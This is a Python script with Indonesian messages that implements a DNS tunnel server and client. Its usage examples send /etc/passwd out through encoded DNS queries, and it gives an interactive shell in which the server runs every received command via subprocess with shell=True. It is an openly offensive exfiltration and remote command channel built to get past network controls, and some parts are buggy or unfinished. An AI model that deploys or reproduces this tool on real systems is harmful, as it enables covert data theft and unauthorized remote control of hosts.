#!/usr/bin/env python3
"""
DNS Tunnel - Tunneling data melalui query DNS (server & client).

Usage (Server):
  sudo python dns_tunnel.py --mode server --domain tunnel.example.com

Usage (Client - transfer file):
  python dns_tunnel.py --mode client --domain tunnel.example.com --server 192.168.1.10 --send /etc/passwd

Usage (Client - interactive shell):
  python dns_tunnel.py --mode client --domain tunnel.example.com --server 192.168.1.10 --shell

Usage (Client - SOCKS proxy):
  python dns_tunnel.py --mode client --domain tunnel.example.com --server 192.168.1.10 --proxy --port 1080
"""

import argparse
import base64
import os
import select
import socket
import struct
import sys
import threading
import time
import zlib

MAGIC_HEADER = b"DNSTNL"
CHUNK_SIZE = 50
MAX_LABEL = 63

BANNER = r"""
  ___  _  _  ___   _____  _   _  _  _   _  _  _       ___ 
 |   \| \| |/ __| |_   _|| | | || \| | | || || |     |_ _|
 | |) | .` |\__ \   | |  | |_| || .` | | \/ |/ _ \    | | 
 |___/|_|\_||___/   |_|   \___/ |_|\_|  \__/ \___/   |___|
"""


def print_info(msg):
    print(f"[*] {msg}")


def print_success(msg):
    print(f"[+] {msg}")


def print_error(msg):
    print(f"[!] {msg}")


def encode_data(data, seq=0):
    encoded = base64.b32encode(data).decode().rstrip("=")
    chunks = []
    for i in range(0, len(encoded), CHUNK_SIZE):
        chunk = encoded[i : i + CHUNK_SIZE]
        label = f"d{seq:04x}.{chunk}"
        if len(label) > MAX_LABEL:
            label = label[:MAX_LABEL]
        chunks.append(label)
        seq += 1
    return chunks


def decode_query(qname, domain):
    base = qname.lower()
    suffix = f".{domain.lower()}"
    if base.endswith(suffix):
        base = base[: -len(suffix)]
    labels = [l for l in base.split(".") if l and not l.startswith("d")]
    data_str = "".join(labels).upper()
    padding = 8 - (len(data_str) % 8)
    if padding < 8:
        data_str += "=" * padding
    try:
        return base64.b32decode(data_str)
    except Exception:
        return b""


def build_txt_response(data, seq=0):
    encoded = base64.b64encode(data).decode()
    chunks = []
    for i in range(0, len(encoded), 200):
        chunk = f"t{seq:04x}:{encoded[i:i + 200]}"
        chunks.append(chunk)
        seq += 1
    return chunks


def parse_dns_query(data):
    try:
        qname_parts = []
        pos = 12
        while pos < len(data):
            length = data[pos]
            if length == 0:
                pos += 1
                break
            if length >= 192:
                pos += 2
                break
            pos += 1
            label = data[pos : pos + length]
            qname_parts.append(label.decode(errors="ignore"))
            pos += length
        qname = ".".join(qname_parts)
        if pos + 4 <= len(data):
            qtype = struct.unpack("!H", data[pos : pos + 2])[0]
            pos += 2
            qclass = struct.unpack("!H", data[pos : pos + 2])[0]
            pos += 2
            return struct.unpack("!H", data[0:2])[0], qname, qtype
    except Exception:
        pass
    return None, "", 0


def build_dns_response(txid, qname, qtype, answers_rdata, domain):
    flags = 0x8180
    try:
        response = struct.pack("!HHHHHH", txid, flags, 1, 1, 0, 0)
        labels = qname.strip(".").split(".")
        for label in labels:
            response += struct.pack("!B", len(label)) + label.encode()
        response += b"\x00"
        response += struct.pack("!HH", qtype, 1)
        response += b"\xc0\x0c"
        response += struct.pack("!HHIH", qtype, 1, 0, 0)
        for rdata in answers_rdata:
            response += struct.pack("!H", len(rdata)) + rdata
        return response
    except Exception:
        return b""


class DNSServer:
    def __init__(self, domain, bind_addr="0.0.0.0", port=53):
        self.domain = domain
        self.bind_addr = bind_addr
        self.port = port
        self.data_buffer = {}
        self.shell_active = False
        self.shell_output = b""
        self.lock = threading.Lock()

    def run(self):
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.sock.bind((self.bind_addr, self.port))
        except PermissionError:
            print_error(f"Port {self.port} butuh root/admin. Coba port >1024.")
            return
        except Exception as e:
            print_error(f"Gagal bind port {self.port}: {e}")
            return

        print_success(f"DNS Tunnel Server berjalan di {self.bind_addr}:{self.port}")
        print_info(f"Domain: {self.domain}")
        print_info("Menunggu query DNS... (Ctrl+C untuk berhenti)")

        try:
            while True:
                data, addr = self.sock.recvfrom(4096)
                if len(data) < 12:
                    continue
                threading.Thread(target=self.handle_query, args=(data, addr), daemon=True).start()
        except KeyboardInterrupt:
            print_info("Server dihentikan.")
        finally:
            self.sock.close()

    def handle_query(self, data, addr):
        txid, qname, qtype = parse_dns_query(data)
        if not qname:
            return
        domain_lower = self.domain.lower()
        if not qname.lower().endswith(domain_lower):
            return
        payload = decode_query(qname, self.domain)
        if not payload:
            return
        try:
            cmd = payload[:8].decode(errors="ignore").strip("\x00").upper()
            args = payload[8:].strip(b"\x00")
        except Exception:
            return

        if cmd == "SHELLIN":
            entry = args.decode(errors="ignore")
            print_info(f"[SHELL] {addr} $ {entry}")
            try:
                import subprocess

                result = subprocess.run(entry, shell=True, capture_output=True, timeout=30)
                output = result.stdout + result.stderr
            except Exception as e:
                output = str(e).encode()
            with self.lock:
                self.shell_output = output
            response_txt = build_txt_response(b"OK", 0)
        elif cmd == "SHELLGET":
            with self.lock:
                out = self.shell_output
                self.shell_output = b""
            response_txt = build_txt_response(out, 0)
        elif cmd == "FILERECV":
            filename = args.decode(errors="ignore").split("\x00")[0]
            key = f"{addr[0]}:{filename}"
            if key not in self.data_buffer:
                self.data_buffer[key] = b""
                response_txt = build_txt_response(b"READY", 0)
            else:
                out = self.data_buffer.pop(key, b"")
                self._save_file(filename, out)
                print_success(f"File diterima: {filename} ({len(out)} bytes)")
                response_txt = build_txt_response(b"DONE", 0)
        elif cmd == "DATA":
            response_txt = build_txt_response(b"ACK", 0)
        else:
            response_txt = build_txt_response(b"UNKNOWN", 0)

        for chunk in response_txt:
            try:
                resp = build_dns_response(txid, qname, 16, [chunk.encode()], self.domain)
                self.sock.sendto(resp, addr)
                time.sleep(0.05)
            except Exception:
                pass

    def _save_file(self, filename, data):
        safe_name = os.path.basename(filename) or "received_file"
        save_path = os.path.join(os.getcwd(), f"dns_tunnel_{safe_name}")
        with open(save_path, "wb") as f:
            f.write(data)
        print_success(f"Disimpan ke: {save_path}")


class DNSClient:
    def __init__(self, domain, server_ip, server_port=53):
        self.domain = domain
        self.server = (server_ip, server_port)
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.settimeout(3)

    def send_packet(self, payload):
        seq = 0
        chunks = encode_data(payload, seq)
        for chunk in chunks:
            qname = f"{chunk}.{self.domain}"
            try:
                self._send_dns_query(qname)
            except Exception:
                pass
            time.sleep(0.1)

    def _send_dns_query(self, qname):
        txid = int(time.time() * 1000) & 0xFFFF
        header = struct.pack("!HHHHHH", txid, 0x0100, 1, 0, 0, 0)
        labels = qname.strip(".").split(".")
        question = b""
        for label in labels:
            question += struct.pack("!B", len(label)) + label.encode()
        question += b"\x00"
        question += struct.pack("!HH", 16, 1) if not question.endswith(b"\x00") else b""
        self.sock.sendto(header + question, self.server)

    def receive_response(self):
        try:
            data, _ = self.sock.recvfrom(4096)
            if len(data) < 12:
                return b""
            txid, flags, qd, an, ns, ar = struct.unpack("!HHHHHH", data[:12])
            if an == 0:
                return b""
            pos = 12
            while pos < len(data) and data[pos] != 0:
                length = data[pos]
                if length >= 192:
                    pos += 2
                    break
                pos += 1 + length
            pos += 1 + 4
            while pos < len(data):
                if data[pos] & 0xC0 == 0xC0:
                    pos += 2
                else:
                    length = data[pos]
                    if length == 0:
                        break
                    pos += 1 + length
                pos += 10
                if pos + 2 <= len(data):
                    rdlength = struct.unpack("!H", data[pos : pos + 2])[0]
                    pos += 2
                    if pos + rdlength <= len(data):
                        txt_data = data[pos : pos + rdlength]
                        if txt_data.startswith(b"t"):
                            colon_idx = txt_data.find(b":")
                            if colon_idx > 0:
                                b64_data = txt_data[colon_idx + 1 :]
                                try:
                                    return base64.b64decode(b64_data)
                                except Exception:
                                    return b""
                        pos += rdlength
            return b""
        except socket.timeout:
            return b""
        except Exception:
            return b""

    def send_file(self, filepath):
        if not os.path.isfile(filepath):
            print_error(f"File tidak ditemukan: {filepath}")
            return
        print_info(f"Mengirim file: {filepath}")
        with open(filepath, "rb") as f:
            data = f.read()
        compressed = zlib.compress(data)
        chunk_size = 50
        total_chunks = (len(compressed) + chunk_size - 1) // chunk_size
        print_info(f"Ukuran: {len(data)} bytes -> {len(compressed)} bytes (terkompresi)")
        print_info(f"Mengirim {total_chunks} chunks...")
        cmd = b"FILERECV\x00" + os.path.basename(filepath).encode() + b"\x00"
        self.send_packet(cmd)
        resp = self.receive_response()
        if b"READY" not in resp:
            print_error("Server tidak siap menerima file.")
            return
        for i in range(0, len(compressed), chunk_size):
            chunk = compressed[i : i + chunk_size]
            self.send_packet(b"DATA" + struct.pack("!I", i) + chunk)
        print_success("File terkirim.")

    def recv_file(self, filename):
        print_info(f"Meminta file: {filename}")
        cmd = b"FILERECV\x00" + filename.encode() + b"\x00"
        self.send_packet(cmd)
        resp = self.receive_response()
        if resp and resp not in (b"READY", b"DONE", b"OK"):
            save_path = os.path.join(os.getcwd(), f"dns_recv_{os.path.basename(filename)}")
            with open(save_path, "wb") as f:
                f.write(resp)
            print_success(f"File diterima: {save_path} ({len(resp)} bytes)")
        else:
            print_error("Gagal menerima file.")

    def interactive_shell(self):
        print_info("Shell interaktif via DNS tunnel. Ketik 'exit' untuk keluar.")
        print_info("Catatan: Lambat karena DNS. Gunakan command singkat.\n")
        try:
            while True:
                cmd_input = input("dns-shell> ")
                if not cmd_input:
                    continue
                if cmd_input.lower() in ("exit", "quit"):
                    break
                cmd = b"SHELLIN" + cmd_input.encode() + b"\x00"
                self.send_packet(cmd)
                time.sleep(1)
                for _ in range(3):
                    get_cmd = b"SHELLGET\x00"
                    self.send_packet(get_cmd)
                    time.sleep(0.5)
                    resp = self.receive_response()
                    if resp:
                        print(resp.decode(errors="replace"), end="")
                        break
                print()
        except KeyboardInterrupt:
            print_info("Shell dihentikan.")


def main():
    parser = argparse.ArgumentParser(
        description="DNS Tunnel - Tunneling data melalui query DNS",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument(
        "--mode", choices=["server", "client"], required=True, help="Mode operasi (server/client)"
    )
    parser.add_argument(
        "--domain", required=True, help="Domain tunnel (contoh: tunnel.example.com)"
    )
    parser.add_argument("--server", help="IP server DNS tunnel (mode client)")
    parser.add_argument("--port", type=int, default=53, help="Port DNS (default: 53)")
    parser.add_argument("--send", help="Kirim file ke server")
    parser.add_argument("--recv", help="Terima file dari server")
    parser.add_argument("--shell", action="store_true", help="Shell interaktif via DNS")
    parser.add_argument("--proxy", action="store_true", help="SOCKS proxy via DNS (TODO)")

    args = parser.parse_args()

    print(BANNER)
    print_info(f"Mode: {args.mode.upper()}")

    if args.mode == "server":
        server = DNSServer(args.domain, port=args.port)
        server.run()
    elif args.mode == "client":
        if not args.server:
            print_error("Mode client butuh --server")
            sys.exit(1)
        client = DNSClient(args.domain, args.server, args.port)
        if args.send:
            client.send_file(args.send)
        elif args.recv:
            client.recv_file(args.recv)
        elif args.shell:
            client.interactive_shell()
        elif args.proxy:
            print_error("SOCKS proxy over DNS belum diimplementasikan.")
            print_info("Gunakan mode --shell untuk shell interaktif.")
        else:
            print_error("Pilih operasi: --send, --recv, --shell, atau --proxy")


if __name__ == "__main__":
    main()
